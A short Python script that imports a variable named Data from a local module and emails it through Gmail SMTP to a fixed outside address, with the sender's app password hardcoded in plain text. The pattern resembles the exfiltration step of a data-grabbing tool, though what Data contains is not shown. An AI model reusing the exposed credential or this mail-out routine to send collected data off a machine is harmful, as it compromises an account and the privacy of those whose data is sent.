import smtplib, ssl
from Script import *
password = "nxqzttgoqqhclszi"
port = 465  # For SSL
smtp_server = "smtp.gmail.com"
sender_email = "moumenisbest@gmail.com"  # Enter your address
receiver_email = "mitva639@gmail.com"  # Enter receiver address
message = f'''\
Subject : Info

Info : \n {Data}
'''
# Create a secure SSL context
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
    server.ehlo()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, message)
    
